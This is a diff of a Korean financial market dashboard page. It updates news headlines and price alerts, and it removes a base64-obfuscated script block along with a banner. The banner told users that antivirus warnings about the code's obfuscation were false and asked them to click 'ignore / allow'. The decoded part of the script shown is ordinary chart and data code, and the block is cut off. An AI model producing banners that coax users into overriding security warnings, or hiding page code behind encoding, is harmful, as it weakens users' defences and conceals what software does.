@@ -531,16 +531,6 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
   white-space:nowrap;
 }
 
-/* 보안 안내 배너 */
-.sec-notice{
-  background:rgba(123,140,255,0.07);
-  border-bottom:1px solid rgba(123,140,255,0.2);
-  padding:8px 28px;
-  font-size:12px;
-  color:rgba(209,213,224,0.7);
-  text-align:center;
-  letter-spacing:0.02em;
-}
 .sec-notice strong{color:var(--accent1);}
 </style>
 </head>
@@ -573,8 +563,7 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
 
 <!-- ══ TOPBAR ══ -->
 <div class="topbar">
-  <div><div class="topbar-logo">◈ Global Market Dashboard<span id="cur-asset-badge">◈ WTI 원유</span></div>
-<div class="sec-notice">🔒 <strong>보안 경고 안내</strong> — 일부 백신이 코드 난독화를 오탐할 수 있습니다. 실제 바이러스가 아니며 개인정보 수집은 없습니다. 경고창에서 <strong>무시 / 허용</strong>을 선택해 주세요.</div><div class="topbar-sub">EIA · FRED · World Bank · IMF · USDA 공식 데이터 기반</div></div>
+  <div><div class="topbar-logo">◈ Global Market Dashboard<span id="cur-asset-badge">◈ WTI 원유</span></div><div class="topbar-sub">EIA · FRED · World Bank · IMF · USDA 공식 데이터 기반</div></div>
   <div class="topbar-right">
     <div class="live-badge"><div class="ldot loading" id="status-dot"></div><span id="status-text">연결 중...</span></div>
     <button class="tb-btn" onclick="loadAllData()">↺ 새로고침</button>
@@ -596,9 +585,9 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
 
     <!-- 핵심 헤드라인 -->
     <div class="headline-news" style="margin-bottom:14px">
-      <div class="hn-tag">🔴 핵심 헤드라인 — 2026.04.08 최신</div>
-      <div class="hn-title">트럼프 "이란 인프라 타격" 협박 후 협상 재개 기대 — WTI $114 돌파, 나스닥 22,090 반등</div>
-      <div class="hn-desc">트럼프 대통령의 이란 인프라 공격 위협과 파키스탄의 2주 연장 중재안 이후 협상 재개 기대로 증시가 낙폭을 회복했어요. WTI는 $114.3으로 상승하며 2022년 이후 최고 수준을 지속하고 있어요. 나스닥은 22,090으로 반등했지만 S&P500은 6,606으로 소폭 하락했어요. EUR/USD는 1.1457로 7일 최저치를 기록하며 달러 강세가 이어지고 있고, USD/JPY는 160.0에 근접했어요.</div>
+      <div class="hn-tag">🔴 핵심 헤드라인 — 2026.04.07 최신</div>
+      <div class="hn-title">WTI $113 돌파 — 호르무즈 협상 교착 속 유가 상승세 지속, 트럼프 화요일 이란 인프라 타격 위협</div>
+      <div class="hn-desc">트럼프 대통령이 이란이 화요일까지 호르무즈 해협을 개방하지 않으면 발전소와 교량 등 민간 인프라를 타격하겠다고 위협하면서 WTI는 $113대로 상승했어요. 이란은 미국의 45일 휴전 제안을 거부했고, 달러는 강세를 유지하며 USD/JPY는 159.8 수준을 기록했습니다. S&P500은 4월 6일 +0.44% 상승해 6,612로 마감, 금은 $4,655로 소폭 회복 중이에요.</div>
       <!-- 출처 링크 (중요도 순) -->
       <div style="margin-top:14px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.07)">
         <div style="font-family:var(--font-n);font-size:14px;color:var(--text2);letter-spacing:0.06em;text-transform:uppercase;margin-bottom:10px;font-weight:600">출처 · 중요도 순</div>
@@ -915,7 +904,7 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
     <div class="pg-title">원유 시장 분석 — 호르무즈 협상 국면과 양방향 변동성</div>
     <div class="pg-sub">협상 진행 속도 × OPEC+ 증산 정책 × 매크로 지표의 3중 교차를 분석합니다.</div>
   </div>
-  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text">⚠️ WTI $114.3 상승 — 트럼프 화요일 협박 이후 협상 재개 기대로 유가 변동성 지속. 호르무즈 재개 합의 시 $100 이하 급락 가능</div></div>
+  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text">⚠️ WTI $113.0 상승 — 트럼프 화요일 이란 인프라 공격 위협으로 유가 추가 상승. 호르무즈 협상 교착 지속 시 $120선 테스트 가능성</div></div>
   <div class="price-hero">
     <div>
       <div class="ph-label" id="lbl-oil">NYMEX · WTI 원유 현물가</div>
@@ -1131,7 +1120,7 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
 <!-- ════════ GOLD ════════ -->
 <div class="asset-page" id="page-gold">
   <div class="pg-title-wrap"><div class="pg-title">금 시장 분석 — 3중 안전자산 수요와 달러 강세의 충돌</div><div class="pg-sub">지정학·인플레·달러 불신이 동시에 금 수요를 견인합니다.</div></div>
-  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text"><strong>금 $4,660 보합 (<span id="alert-date-gold"></span>)</strong> — 달러 강세 속에서도 $4,600 지지 유지. 이란 전쟁 불확실성이 하단 방어 역할 중</div></div>
+  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text"><strong>금 $4,655 소폭 회복 (<span id="alert-date-gold"></span>)</strong> — 이란 전쟁 장기화 속 안전자산 수요 재확인. 달러 강세에도 $4,600선 지지 유지하며 반등 시도 중</div></div>
   <div class="price-hero">
     <div>
       <div class="ph-label" id="lbl-gold">FRED · GOLDAMGBD228NLBM · 런던 고정가</div>
@@ -1203,7 +1192,7 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
 <!-- ════════ SP500 ════════ -->
 <div class="asset-page" id="page-sp500">
   <div class="pg-title-wrap"><div class="pg-title">S&P 500 분석 — 지정학·에너지 충격과 Fed 금리 환경</div><div class="pg-sub">호르무즈 봉쇄발 에너지 인플레이션이 주식시장 밸류에이션을 압박하고 있습니다.</div></div>
-  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text"><strong>S&P500 6,606 소폭 하락 (<span id="alert-date-sp500"></span>)</strong> — 트럼프 마감시한 불확실성 해소 후 변동성 축소. 나스닥은 22,090 반등. 4월 중순 빅테크 Q1 실적이 추가 방향 결정</div></div>
+  <div class="alert-banner"><div class="alert-dot"></div><div class="alert-text"><strong>S&P500 6,612 상승 — 4일 연속 랠리 (<span id="alert-date-sp500"></span>)</strong> — 이란 휴전 기대로 4일 연속 상승. 트럼프 화요일 마감시한 앞두고 선물 소폭 하락. 빅테크 Q1 실적(4월 중순)이 다음 방향 결정</div></div>
   <div class="price-hero">
     <div>
       <div class="ph-label" id="lbl-sp500">FRED · SP500 · Daily</div>
@@ -1883,1114 +1872,1062 @@ body{font-family:var(--font-b);background:var(--bg);color:var(--text);min-height
 </div><!-- page -->
 
 <script>
-var _c_=[
-"Ci8vIOKVkOKVkOKVkCBDT05GSUcg4pWQ4pWQ4pWQCmNvbnN0IEtFWVM9e0VJQTonZ21kM19laWEnLEZS",
-"RUQ6J2dtZDNfZnJlZCd9Owpjb25zdCBnZXRLZXk9dD0+bG9jYWxTdG9yYWdlLmdldEl0ZW0oS0VZU1t0",
-"XSl8fCcnOwpjb25zdCBGQj17CiAgb2lsOnt2OjExNC4zLHA6MTEzLjAsZDonMjAyNi0wNC0wOCd9LAog",
-"IGdhczp7djoyLjg0LHA6Mi44NCxkOicyMDI2LTA0LTA4J30sCiAgZ29sZDp7djo0NjYwLHA6NDY1NSxk",
-"OicyMDI2LTA0LTA4J30sCiAgc3A1MDA6e3Y6NjYwNixwOjY2MTIsZDonMjAyNi0wNC0wOCd9LAogIHQx",
-"MHk6e3Y6NC4zMSxwOjQuMzQsZDonMjAyNi0wNC0wOCd9LAogIGF1ZDp7djowLjY4NzAscDowLjY5MTIs",
-"ZDonMjAyNi0wNC0wOCd9LAogIHNveTp7djo0MjkscDo0MzAsZDonMjAyNi0wNCd9LAogIG5hc2RhcTp7",
-"djoyMjA5MCxwOjIxOTk2LGQ6JzIwMjYtMDQtMDgnfSwKICBldXJvZng6e3Y6MS4xNDU3LHA6MS4xNTcw",
-"LGQ6JzIwMjYtMDQtMDgnfSwKICBqcHk6e3Y6MTYwLjAscDoxNTkuOCxkOicyMDI2LTA0LTA4J30sCiAg",
-"Y29ybjp7djoxNzkscDoxODAsZDonMjAyNi0wNCd9LAogIHdoZWF0Ont2OjIxOSxwOjIyNixkOicyMDI2",
-"LTA0J30sCiAgb2lsUzpbe2Q6JzAzLzIxJyx2OjkzLjh9LHtkOicwMy8yMycsdjo5NS41fSx7ZDonMDMv",
-"MjQnLHY6OTIuMzV9LHtkOicwMy8yNScsdjo4Ny4wNX0se2Q6JzAzLzMxJyx2OjEwMy41fSx7ZDonMDQv",
-"MDInLHY6OTkuOH0se2Q6JzA0LzAzJyx2OjEwNS4wfSx7ZDonMDQvMDYnLHY6MTExLjV9LHtkOicwNC8w",
-"NycsdjoxMTMuMH0se2Q6JzA0LzA4Jyx2OjExNC4zfV0sCiAgZ2FzUzpbe2Q6JzAzLzIxJyx2OjMuMjF9",
-"LHtkOicwMy8yMycsdjozLjIxfSx7ZDonMDMvMjQnLHY6My4wMH0se2Q6JzAzLzI1Jyx2OjIuOTB9LHtk",
-"OicwMy8zMScsdjoyLjg0fSx7ZDonMDQvMDInLHY6Mi45OH0se2Q6JzA0LzAzJyx2OjMuMDV9LHtkOicw",
-"NC8wNicsdjoyLjg3fSx7ZDonMDQvMDcnLHY6Mi44NH0se2Q6JzA0LzA4Jyx2OjIuODR9XSwKICBnb2xk",
-"Uzpbe2Q6JzAzLzIxJyx2OjQ1NzR9LHtkOicwMy8yMycsdjo0NDg4fSx7ZDonMDMvMjQnLHY6NDQwNX0s",
-"e2Q6JzAzLzI1Jyx2OjQ0MTZ9LHtkOicwMy8zMScsdjo0NTQwfSx7ZDonMDQvMDInLHY6NDY5NX0se2Q6",
-"JzA0LzAzJyx2OjQ2OTB9LHtkOicwNC8wNicsdjo0NjMyfSx7ZDonMDQvMDcnLHY6NDY1NX0se2Q6JzA0",
-"LzA4Jyx2OjQ2NjB9XSwKICBzcDUwMFM6W3tkOicwMy8yMScsdjo2NTA3fSx7ZDonMDMvMjMnLHY6NjUw",
-"N30se2Q6JzAzLzI0Jyx2OjY1NTZ9LHtkOicwMy8yNScsdjo2NTgyfSx7ZDonMDMvMzEnLHY6NjM0NH0s",
-"e2Q6JzA0LzAyJyx2OjY1MTd9LHtkOicwNC8wMycsdjo2NTgzfSx7ZDonMDQvMDYnLHY6NjYxMn0se2Q6",
-"JzA0LzA3Jyx2OjY2MTJ9LHtkOicwNC8wOCcsdjo2NjA2fV0sCiAgdDEweVM6W3tkOicwMy8yMScsdjo0",
-"LjI4fSx7ZDonMDMvMjMnLHY6NC4yOH0se2Q6JzAzLzI0Jyx2OjQuNDJ9LHtkOicwMy8yNScsdjo0LjM4",
-"fSx7ZDonMDMvMzEnLHY6NC4zNH0se2Q6JzA0LzAyJyx2OjQuMzd9LHtkOicwNC8wMycsdjo0LjM0fSx7",
-"ZDonMDQvMDYnLHY6NC4zMX0se2Q6JzA0LzA3Jyx2OjQuMzR9LHtkOicwNC8wOCcsdjo0LjMxfV0sCiAg",
-"YXVkUzpbe2Q6JzAzLzIxJyx2OjAuNjI1fSx7ZDonMDMvMjMnLHY6MC42MjQ1fSx7ZDonMDMvMjQnLHY6",
-"MC43MDIwfSx7ZDonMDMvMjUnLHY6MC43MDkwfSx7ZDonMDMvMzEnLHY6MC42ODV9LHtkOicwNC8wMics",
-"djowLjY4NjB9LHtkOicwNC8wMycsdjowLjY5MTB9LHtkOicwNC8wNicsdjowLjY4OTF9LHtkOicwNC8w",
-"NycsdjowLjY5MTJ9LHtkOicwNC8wOCcsdjowLjY4NzB9XSwKICBzb3lTOlt7ZDonMjAyNS8xMCcsdjoz",
-"ODV9LHtkOicyMDI1LzExJyx2OjM3OH0se2Q6JzIwMjUvMTInLHY6MzcxfSx7ZDonMjAyNi8wMScsdjoz",
-"Njh9LHtkOicyMDI2LzAyJyx2OjM3Mn0se2Q6JzIwMjYvMDMnLHY6NDI2fSx7ZDonMjAyNi8wNCcsdjo0",
-"Mjl9XSwKICBuYXNkYXFTOlt7ZDonMDMvMjMnLHY6MTg4MjB9LHtkOicwMy8yNCcsdjoyMTc2Mn0se2Q6",
-"JzAzLzI1Jyx2OjIxODU4fSx7ZDonMDMvMjcnLHY6MjA5NDh9LHtkOicwMy8zMScsdjoyMDc5NX0se2Q6",
-"JzA0LzAyJyx2OjIxMzUwfSx7ZDonMDQvMDMnLHY6MjE4Nzl9LHtkOicwNC8wNicsdjoyMTk5Nn0se2Q6",
-"JzA0LzA3Jyx2OjIxOTk2fSx7ZDonMDQvMDgnLHY6MjIwOTB9XSwKICBldXJvZnhTOlt7ZDonMDMvMjEn",
-"LHY6MS4wODN9LHtkOicwMy8yMycsdjoxLjA4MjR9LHtkOicwMy8yNCcsdjoxLjE1NDB9LHtkOicwMy8y",
-"NScsdjoxLjE2MDB9LHtkOicwMy8zMScsdjoxLjE0NTB9LHtkOicwNC8wMicsdjoxLjE1NTN9LHtkOicw",
-"NC8wMycsdjoxLjE1MjB9LHtkOicwNC8wNicsdjoxLjE1MjJ9LHtkOicwNC8wNycsdjoxLjE1NzB9LHtk",
-"OicwNC8wOCcsdjoxLjE0NTd9XSwKICBqcHlTOlt7ZDonMDMvMjEnLHY6MTQ4Ljl9LHtkOicwMy8yMycs",
-"djoxNDguNn0se2Q6JzAzLzI0Jyx2OjE1OC4yfSx7ZDonMDMvMjUnLHY6MTU5LjB9LHtkOicwMy8zMScs",
-"djoxNjEuNX0se2Q6JzA0LzAyJyx2OjE1OS44fSx7ZDonMDQvMDMnLHY6MTU5LjR9LHtkOicwNC8wNics",
-"djoxNTkuNn0se2Q6JzA0LzA3Jyx2OjE1OS44fSx7ZDonMDQvMDgnLHY6MTYwLjB9XSwKICBjb3JuUzpb",
-"e2Q6JzIwMjUvMTAnLHY6MTgwfSx7ZDonMjAyNS8xMScsdjoxNzh9LHtkOicyMDI1LzEyJyx2OjE3N30s",
-"e2Q6JzIwMjYvMDEnLHY6MTc2fSx7ZDonMjAyNi8wMicsdjoxNzV9LHtkOicyMDI2LzAzJyx2OjE3OX0s",
-"e2Q6JzIwMjYvMDQnLHY6MTc5fV0sCiAgd2hlYXRTOlt7ZDonMjAyNS8xMCcsdjoyMDh9LHtkOicyMDI1",
-"LzExJyx2OjIxMn0se2Q6JzIwMjUvMTInLHY6MjE1fSx7ZDonMjAyNi8wMScsdjoyMTZ9LHtkOicyMDI2",
-"LzAyJyx2OjIxOH0se2Q6JzIwMjYvMDMnLHY6MjIzfSx7ZDonMjAyNi8wNCcsdjoyMTl9XQp9Owpjb25z",
-"dCBNPVsnM+yblCcsJzTsm5QnLCc17JuUJywnNuyblCcsJzfsm5QnLCc47JuUJywnOeyblCcsJzEw7JuU",
-"JywnMTHsm5QnLCcxMuyblCddOwoKLy8g4pWQ4pWQ4pWQIFNFVFVQIOKVkOKVkOKVkApmdW5jdGlvbiBz",
-"YXZlS2V5cygpe2NvbnN0IGU9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VpYS1pbnB1dCcpLnZhbHVl",
-"LnRyaW0oKSxmPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmcmVkLWlucHV0JykudmFsdWUudHJpbSgp",
-"O2lmKGUpbG9jYWxTdG9yYWdlLnNldEl0ZW0oS0VZUy5FSUEsZSk7aWYoZilsb2NhbFN0b3JhZ2Uuc2V0",
-"SXRlbShLRVlTLkZSRUQsZik7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NldHVwLW92ZXJsYXknKS5z",
-"dHlsZS5kaXNwbGF5PSdub25lJztsb2FkQWxsRGF0YSgpfQpmdW5jdGlvbiBza2lwU2V0dXAoKXtkb2N1",
-"bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dXAtb3ZlcmxheScpLnN0eWxlLmRpc3BsYXk9J25vbmUnO2Rv",
-"Y3VtZW50LmdldEVsZW1lbnRCeUlkKCdub3RpY2UtZmFsbGJhY2snKS5jbGFzc0xpc3QuYWRkKCdzaG93",
-"Jyk7YXBwbHlGYWxsYmFjaygpO2J1aWxkQWxsQ2hhcnRzKCdvaWwnKX0KZnVuY3Rpb24gc2hvd1NldHVw",
-"KCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NldHVwLW92ZXJsYXknKS5zdHlsZS5kaXNwbGF5PSdm",
-"bGV4Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZWlhLWlucHV0JykudmFsdWU9Z2V0S2V5KCdFSUEn",
-"KTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZnJlZC1pbnB1dCcpLnZhbHVlPWdldEtleSgnRlJFRCcp",
-"fQpmdW5jdGlvbiBzZXRTdGF0dXMoYyx0KXtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhdHVzLWRv",
-"dCcpLmNsYXNzTmFtZT0nbGRvdCAnK2M7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0YXR1cy10ZXh0",
-"JykudGV4dENvbnRlbnQ9dH0KCi8vIOKVkOKVkOKVkCBUQUJTIOKVkOKVkOKVkApsZXQgY3VyQXNzZXQ9",
-"J29pbCc7Cgpjb25zdCBBU1NFVF9OQU1FUz17CiAgb2lsOidXVEkg7JuQ7JygJyxnYXM6J+yynOyXsOqw",
-"gOyKpCcsZ29sZDon6riIJyxzcDUwMDonUyZQIDUwMCcsCiAgdDEweTonMTDrhYQg6rWt7LGEJyxhdWQ6",
-"J+2YuOyjvOuLrOufrCcsc295OifrjIDrkZAnLG5hc2RhcTon64KY7Iqk64ulJywKICBldXJvZng6J+yc",
-"oOuhnEZYJyxqcHk6J+yXlO2ZlCcsY29ybjon7Jil7IiY7IiYJyx3aGVhdDon67CAJyxjYWxlbmRhcjon",
-"6rK97KCc7J287KCVJwp9OwpmdW5jdGlvbiBzd2l0Y2hBc3NldChpZCxlbCl7CiAgZG9jdW1lbnQucXVl",
-"cnlTZWxlY3RvckFsbCgnLmFzc2V0LXRhYicpLmZvckVhY2godD0+dC5jbGFzc0xpc3QucmVtb3ZlKCdh",
-"Y3RpdmUnKSk7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmFzc2V0LXBhZ2UnKS5mb3JFYWNo",
-"KHA9PnAuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGVsLmNsYXNzTGlzdC5hZGQoJ2FjdGl2",
-"ZScpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYWdlLScraWQpLmNsYXNzTGlzdC5hZGQoJ2Fj",
-"dGl2ZScpOwogIGN1ckFzc2V0PWlkOwogIC8vIOuwsOyngCDsl4XrjbDsnbTtirgKICB2YXIgYmFkZ2U9",
-"ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1ci1hc3NldC1iYWRnZScpOwogIGlmKGJhZGdlJiZBU1NF",
-"VF9OQU1FU1tpZF0pYmFkZ2UudGV4dENvbnRlbnQ9J+KXiCAnK0FTU0VUX05BTUVTW2lkXTsKICBpZihp",
-"ZD09PSdjYWxlbmRhcicpe3NldFRpbWVvdXQoKCk9PnJlbmRlckNhbGVuZGFyKCksNjApO3JldHVybjt9",
-"CiAgc2V0VGltZW91dCgoKT0+e2J1aWxkQWxsQ2hhcnRzKGlkKTthcHBseVNlYXNvbkJhckdyYWRpZW50",
-"KCk7YWRkU291cmNlTGlua3MoKTt9LDYwKTsKfQoKLy8g4pWQ4pWQ4pWQIE5BViDilZDilZDilZAKZnVu",
-"Y3Rpb24gdXBkYXRlTmF2KGlkLHYscCx1LGQpewogIGNvbnN0IHBlPWRvY3VtZW50LmdldEVsZW1lbnRC",
-"eUlkKCduYXYtJytpZCsnLXByaWNlJyk7CiAgY29uc3QgY2U9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQo",
-"J25hdi0nK2lkKyctY2hnJyk7CiAgaWYoIXBlKXJldHVybjsKICBwZS50ZXh0Q29udGVudD12LnRvRml4",
-"ZWQoZD8/MikrKHU/JyAnK3U6JycpOwogIGlmKHAhPW51bGwpe2NvbnN0IGRpZmY9di1wLHM9ZGlmZj49",
-"MD8nKyc6Jyc7Y29uc3QgcGN0PSgoZGlmZi9wKSoxMDApLnRvRml4ZWQoMSk7Y2UuY2xhc3NOYW1lPSdh",
-"dC1jaGcgJysoZGlmZj4wPyd1cCc6ZGlmZjwwPydkbic6J250Jyk7Y2UudGV4dENvbnRlbnQ9cytwY3Qr",
-"JyUnO30KfQoKLy8g4pWQ4pWQ4pWQIENIQVJUUyDilZDilZDilZAKQ2hhcnQuZGVmYXVsdHMuZm9udC5m",
-"YW1pbHk9IidJQk0gUGxleCBNb25vJyxtb25vc3BhY2UiOwpjb25zdCBHQz0ncmdiYSgxMjAsMTQwLDIw",
-"MCwwLjA4KScsVEM9JyM2Yjc2OTQnOwpjb25zdCBDSD17fTsKZnVuY3Rpb24gbWtDYW5kbGUoaWQsbGFi",
-"ZWxzLGNsb3Nlcyxjb2xvcix1bml0KXsKICBpZihDSFtpZF0mJkNIW2lkXS5kZXN0cm95KUNIW2lkXS5k",
-"ZXN0cm95KCk7CiAgY29uc3QgY2FudmFzPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTtpZighY2Fu",
-"dmFzKXJldHVybjsKICBjb25zdCBwYXI9Y2FudmFzLnBhcmVudEVsZW1lbnQ7CiAgY29uc3QgVz1wYXIu",
-"b2Zmc2V0V2lkdGh8fDY0MCxIPTI2MDsKICBjYW52YXMud2lkdGg9VztjYW52YXMuaGVpZ2h0PUg7CiAg",
-"Y29uc3QgY3R4PWNhbnZhcy5nZXRDb250ZXh0KCcyZCcpOwoKICBjb25zdCBwYWQ9e3Q6MTYscjo1Mixi",
-"OjI4LGw6NjJ9OwogIGNvbnN0IHBXPVctcGFkLmwtcGFkLnIscEg9SC1wYWQudC1wYWQuYjsKICBjb25z",
-"dCB5TWF4PU1hdGgubWF4KC4uLmNsb3NlcykqMS4wMTUseU1pbj1NYXRoLm1pbiguLi5jbG9zZXMpKjAu",
-"OTg1OwogIGNvbnN0IHlSbmc9eU1heC15TWluOwogIGNvbnN0IHRvWT12PT5wYWQudCtwSC0oKHYteU1p",
-"bikveVJuZykqcEg7CiAgY29uc3QgdG9YPWk9PnBhZC5sKyhpLyhjbG9zZXMubGVuZ3RoLTEpKSpwVzsK",
-"ICBjb25zdCBuPWNsb3Nlcy5sZW5ndGg7CgogIC8vIOuwsOqyvQogIGN0eC5maWxsU3R5bGU9JyMxMzE3",
-"MjInO2N0eC5maWxsUmVjdCgwLDAsVyxIKTsKCiAgLy8g6re466as65OcICsgWey2lQogIGNvbnN0IGdT",
-"dGVwcz01OwogIGZvcihsZXQgaT0wO2k8PWdTdGVwcztpKyspewogICAgY29uc3QgeT1wYWQudCsocEgv",
-"Z1N0ZXBzKSppOwogICAgY29uc3Qgdj15TWF4LSh5Um5nL2dTdGVwcykqaTsKICAgIGN0eC5zdHJva2VT",
-"dHlsZT0ncmdiYSgxMjAsMTQwLDIwMCwwLjA4KSc7Y3R4LmxpbmVXaWR0aD0xOwogICAgY3R4LmJlZ2lu",
-"UGF0aCgpO2N0eC5tb3ZlVG8ocGFkLmwseSk7Y3R4LmxpbmVUbyhXLXBhZC5yLHkpO2N0eC5zdHJva2Uo",
-"KTsKICAgIGN0eC5maWxsU3R5bGU9JyM0YTUyNjgnO2N0eC5mb250PScxMHB4IE51bml0byxzYW5zLXNl",
-"cmlmJztjdHgudGV4dEFsaWduPSdyaWdodCc7CiAgICBjb25zdCBkcD12Pj0xMDAwPzA6dj49MTA/MTp2",
-"Pj0xPzI6NDsKICAgIGN0eC5maWxsVGV4dCh2LnRvRml4ZWQoZHApLHBhZC5sLTUseSszLjUpOwogIH0K",
-"CiAgLy8gWOy2lSDroIjsnbTruJQKICBjdHguZmlsbFN0eWxlPScjNGE1MjY4JztjdHguZm9udD0nMTBw",
-"eCBOdW5pdG8sc2Fucy1zZXJpZic7Y3R4LnRleHRBbGlnbj0nY2VudGVyJzsKICBjb25zdCBzdGVwPU1h",
-"dGguY2VpbChuLzYpOwogIGxhYmVscy5mb3JFYWNoKChsYixpKT0+e2lmKGklc3RlcD09PTB8fGk9PT1u",
-"LTEpY3R4LmZpbGxUZXh0KGxiLHRvWChpKSxILTcpO30pOwoKICAvLyDrnbzsnbgg7JWE656YIOq3uOud",
-"vOuNsOydtOyFmCDssYTsm4AKICBjb25zdCBncmFkPWN0eC5jcmVhdGVMaW5lYXJHcmFkaWVudCgwLHBh",
-"ZC50LDAsSC1wYWQuYik7CiAgZ3JhZC5hZGRDb2xvclN0b3AoMCxjb2xvcisnNDAnKTsKICBncmFkLmFk",
-"ZENvbG9yU3RvcCgxLGNvbG9yKycwNCcpOwogIGN0eC5iZWdpblBhdGgoKTsKICBjdHgubW92ZVRvKHRv",
-"WCgwKSx0b1koY2xvc2VzWzBdKSk7CiAgZm9yKGxldCBpPTE7aTxuO2krKykgY3R4LmxpbmVUbyh0b1go",
-"aSksdG9ZKGNsb3Nlc1tpXSkpOwogIGN0eC5saW5lVG8odG9YKG4tMSksSC1wYWQuYik7CiAgY3R4Lmxp",
-"bmVUbyh0b1goMCksSC1wYWQuYik7CiAgY3R4LmNsb3NlUGF0aCgpOwogIGN0eC5maWxsU3R5bGU9Z3Jh",
-"ZDtjdHguZmlsbCgpOwoKICAvLyDrqZTsnbgg65287J24CiAgY3R4LmJlZ2luUGF0aCgpOwogIGN0eC5t",
-"b3ZlVG8odG9YKDApLHRvWShjbG9zZXNbMF0pKTsKICBmb3IobGV0IGk9MTtpPG47aSsrKSBjdHgubGlu",
-"ZVRvKHRvWChpKSx0b1koY2xvc2VzW2ldKSk7CiAgY3R4LnN0cm9rZVN0eWxlPWNvbG9yO2N0eC5saW5l",
-"V2lkdGg9MjtjdHgubGluZUpvaW49J3JvdW5kJzsKICBjdHguc2hhZG93Q29sb3I9Y29sb3I7Y3R4LnNo",
-"YWRvd0JsdXI9NjsKICBjdHguc3Ryb2tlKCk7CiAgY3R4LnNoYWRvd0JsdXI9MDsKCiAgLy8g66eI7KeA",
-"66eJIOqwgOqyqSDsoJDshKAKICBjb25zdCBsYXN0WT10b1koY2xvc2VzW24tMV0pOwogIGN0eC5zZXRM",
-"aW5lRGFzaChbMywzXSk7Y3R4LnN0cm9rZVN0eWxlPSdyZ2JhKDEyMywxNDAsMjU1LDAuNSknO2N0eC5s",
-"aW5lV2lkdGg9MTsKICBjdHguYmVnaW5QYXRoKCk7Y3R4Lm1vdmVUbyhwYWQubCxsYXN0WSk7Y3R4Lmxp",
-"bmVUbyhXLXBhZC5yLGxhc3RZKTtjdHguc3Ryb2tlKCk7CiAgY3R4LnNldExpbmVEYXNoKFtdKTsKCiAg",
-"Ly8g66eI7KeA66eJIOqwgOqyqSDroIjsnbTruJQKICBjdHguZmlsbFN0eWxlPSdyZ2JhKDEyMywxNDAs",
-"MjU1LDAuOSknOwogIGN0eC5maWxsUmVjdChXLXBhZC5yKzEsbGFzdFktOSxwYWQuci0yLDE4KTsKICBj",
-"dHguZmlsbFN0eWxlPScjZmZmJztjdHguZm9udD0nYm9sZCAxMHB4IE51bml0byxzYW5zLXNlcmlmJztj",
-"dHgudGV4dEFsaWduPSdjZW50ZXInOwogIGNvbnN0IGRwMj1jbG9zZXNbbi0xXT49MTAwMD8wOmNsb3Nl",
-"c1tuLTFdPj0xMD8xOmNsb3Nlc1tuLTFdPj0xPzI6NDsKICBjdHguZmlsbFRleHQoY2xvc2VzW24tMV0u",
-"dG9GaXhlZChkcDIpLFctcGFkLnIrKHBhZC5yLzIpLGxhc3RZKzMuNSk7CgogIC8vIOuniOyngOuniSDt",
-"j6zsnbjtirggZG90CiAgY3R4LmJlZ2luUGF0aCgpO2N0eC5hcmModG9YKG4tMSksbGFzdFksMy41LDAs",
-"TWF0aC5QSSoyKTsKICBjdHguZmlsbFN0eWxlPWNvbG9yO2N0eC5zaGFkb3dDb2xvcj1jb2xvcjtjdHgu",
-"c2hhZG93Qmx1cj04O2N0eC5maWxsKCk7CiAgY3R4LnNoYWRvd0JsdXI9MDsKCiAgQ0hbaWRdPXtkZXN0",
-"cm95OigpPT57Y3R4LmNsZWFyUmVjdCgwLDAsVyxIKTt9fTsKfQpmdW5jdGlvbiBta1NjZW5hcmlvKGlk",
-"LGxibCxiYXNlLGJ1bGwsYmVhcix1bml0KXsKICBpZihDSFtpZF0pe0NIW2lkXS5kZXN0cm95KCl9CiAg",
-"Y29uc3QgY3R4PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTtpZighY3R4KXJldHVybjsKICBDSFtp",
-"ZF09bmV3IENoYXJ0KGN0eCx7dHlwZTonbGluZScsZGF0YTp7bGFiZWxzOmxibCxkYXRhc2V0czpbCiAg",
-"ICB7bGFiZWw6J+q4sOuzuCcsZGF0YTpiYXNlLGJvcmRlckNvbG9yOicjMDBjODk2Jyxib3JkZXJXaWR0",
-"aDoyLHRlbnNpb246MC4zLHBvaW50UmFkaXVzOjIscG9pbnRCYWNrZ3JvdW5kQ29sb3I6JyMwMGM4OTYn",
-"LGZpbGw6ZmFsc2V9LAogICAge2xhYmVsOifsg4HrsKknLGRhdGE6YnVsbCxib3JkZXJDb2xvcjonI2Yw",
-"NDg2MCcsYm9yZGVyRGFzaDpbNSw0XSxib3JkZXJXaWR0aDoxLjUsdGVuc2lvbjowLjMscG9pbnRSYWRp",
-"dXM6MCxmaWxsOmZhbHNlfSwKICAgIHtsYWJlbDon7ZWY67CpJyxkYXRhOmJlYXIsYm9yZGVyQ29sb3I6",
-"JyNhNzhiZmEnLGJvcmRlckRhc2g6WzUsNF0sYm9yZGVyV2lkdGg6MS41LHRlbnNpb246MC4zLHBvaW50",
